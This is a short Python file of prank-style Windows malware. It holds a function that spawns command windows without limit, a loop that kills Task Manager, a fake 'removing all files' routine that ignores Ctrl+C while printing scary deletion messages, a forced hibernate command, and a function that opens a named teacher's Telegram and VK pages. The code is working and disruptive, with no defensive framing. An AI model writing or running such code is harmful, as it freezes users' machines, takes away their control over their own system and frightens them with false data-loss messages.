def cmd_bimba():
    import os
    from multiprocessing import Process

    def _cmd_bimba():
        while True:
            os.system("start cmd")

    while True:
        Process(target=_cmd_bimba).start()


def _discharge_process_manager():
    import psutil

    def _is_task_manager_running():
        for process in psutil.process_iter(['name']):
            if process.info['name'] == 'Taskmgr.exe':
                return process
        return None

    while True:
        try:
            process = _is_task_manager_running()
            if process is not None:
                process.kill()
        except BaseException:
            pass


def removing_all_files():
    from os.path import exists
    from pathlib import Path
    from time import sleep
    from random import random, randint
    import signal

    disks = [f"{d}:\\" for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if exists(f"{d}:\\")]

    def _ignore_ctrl_c(signum, frame):
        pass

    signal.signal(signal.SIGINT, _ignore_ctrl_c)

    print("Starting removing system ...")
    sleep(1)

    for disk in disks:
        for file_path in Path(disk).glob("**/*"):
            if file_path.is_file():
                print(f"Removing {file_path} ", end=".")
                sleep(int(random() * 100) / randint(100, 1000))
                print(end=".")
                sleep(int(random() * 100) / randint(750, 1000))
                print(".")
                sleep(int(random() * 100) / randint(750, 1000))
                print(f"File {file_path} removed successfuly")


def open_teachers_page():
    import os
    tg = "https://t.me/alexanderziyatdinov"
    vk = "https://vk.com/aleksandr_ziyatdinov"
    print("Открываю страницы превосходного преподавателя ...")

    os.system(f"start {tg}")
    os.system(f"start {vk}")


def hihihaha():
    import os
    from time import sleep
    print("He-he ha-ha")
    sleep(1)
    os.system("shutdown /f /h")